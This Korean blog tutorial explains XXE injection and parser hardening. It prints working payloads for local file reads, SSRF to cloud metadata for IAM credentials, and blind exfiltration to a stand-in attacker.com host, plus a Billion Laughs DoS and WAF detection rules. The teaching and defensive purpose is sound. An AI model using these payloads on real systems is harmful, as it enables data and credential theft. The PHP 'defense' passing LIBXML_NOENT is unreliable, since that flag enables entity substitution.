---
title: "XXE 인젝션: XML 외부 엔티티 공격 완전 해설"
description: "XML External Entity(XXE) 인젝션의 원리, 서버 파일 읽기·SSRF·DoS로 이어지는 공격 체인, 그리고 외부 엔티티 처리 비활성화로 완벽하게 방어하는 방법을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-05"
archiveOrder: 4
type: "knowledge"
category: "Security"
tags: ["XXE", "XMLInjection", "외부엔티티", "OWASP", "SSRF", "웹보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-sensitive-data-exposure/)에서 민감 데이터 노출을 살펴봤다. 이번에는 XML 파서의 기능을 악용하는 **XXE(XML External Entity) 인젝션**을 다룬다. 2017년 OWASP Top 10에 독립 항목으로 등재되었을 만큼 심각한 취약점이다.

## XXE란?

XML은 `<!ENTITY>` 선언을 통해 문서 내에서 재사용 가능한 콘텐츠를 정의할 수 있다. 외부 엔티티(External Entity)는 이 기능을 확장해 **외부 파일이나 URL의 내용을 XML 문서에 포함**시킨다. 취약한 XML 파서는 공격자가 이 기능을 악용해 서버 내부 파일을 읽거나 내부 네트워크로 요청을 보낼 수 있게 한다.

## 공격 흐름

![XXE 공격 흐름](/assets/posts/websec-xxe-attack.svg)

### 기본 파일 읽기 공격

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

취약한 서버는 `&xxe;` 를 `/etc/passwd` 내용으로 치환해 응답한다.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### Windows 시스템 공격

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<data>&xxe;</data>
```

### SSRF(서버 측 요청 위조)로 내부망 탐색

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```

AWS 메타데이터 서비스에 접근해 IAM 자격증명을 탈취할 수 있다.

### 블라인드 XXE (응답에 내용이 없는 경우)

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

공격자 서버의 `evil.dtd`:

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

데이터가 out-of-band로 공격자 서버에 전송된다.

### 서비스 거부 (Billion Laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

엔티티가 지수적으로 확장되어 메모리를 고갈시킨다.

## 방어 전략

![XXE 방어: 외부 엔티티 비활성화](/assets/posts/websec-xxe-defense.svg)

### Java — DocumentBuilderFactory

```java
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// 외부 엔티티 처리 비활성화
factory.setFeature(
    "http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature(
    "http://xml.org/sax/features/external-general-entities", false);
factory.setFeature(
    "http://xml.org/sax/features/external-parameter-entities", false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
```

### Python — defusedxml 사용

```python
# ❌ 취약: 표준 라이브러리 사용
import xml.etree.ElementTree as ET
tree = ET.parse('input.xml')  # XXE 취약!

# ✅ 안전: defusedxml 사용
import defusedxml.ElementTree as ET
tree = ET.parse('input.xml')  # 외부 엔티티 자동 차단

# pip install defusedxml
```

### Node.js — libxmljs2 설정

```javascript
const libxml = require('libxmljs2')

// ✅ 외부 엔티티 비활성화
const doc = libxml.parseXml(xmlString, {
  noent: false,     // 엔티티 처리 비활성화
  nonet: true,      // 네트워크 접근 비활성화
  dtdload: false,   // DTD 로딩 비활성화
  dtdvalid: false,
})
```

### PHP — libxml_disable_entity_loader

```php
<?php
// PHP 8.0 이전
libxml_disable_entity_loader(true);

// PHP 8.0 이후 — 기본적으로 비활성화되어 있음
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);
```

## JSON 또는 다른 포맷으로 마이그레이션

가장 근본적인 해결책은 XML을 JSON이나 다른 안전한 포맷으로 대체하는 것이다.

```javascript
// XML API를 JSON API로 전환
app.post('/api/import', express.json(), (req, res) => {
  const data = req.body  // JSON은 XXE 취약점 없음
  processData(data)
  res.json({ success: true })
})
```

## WAF 규칙

```yaml
# ModSecurity XXE 탐지 규칙
SecRule REQUEST_BODY "@contains SYSTEM" \
  "id:1000001,phase:2,deny,status:403,msg:'XXE Attack'"

SecRule REQUEST_BODY "@rx <!--.*DOCTYPE.*\[" \
  "id:1000002,phase:2,deny,status:403,msg:'XXE DOCTYPE'"
```

## 핵심 원칙

XML 파서는 기본적으로 외부 엔티티를 처리하도록 설계되었다. 이 기능이 필요한 경우는 매우 드물다. **모든 XML 파서에서 외부 엔티티 처리를 명시적으로 비활성화**하는 것이 최선의 방어다.

---

**지난 글:** [민감 데이터 노출: 정보 유출 방지하기](/posts/websec-sensitive-data-exposure/)

**다음 글:** [안전하지 않은 역직렬화: RCE로 이어지는 위험](/posts/websec-insecure-deserialization/)

<br>
읽어주셔서 감사합니다. 😊
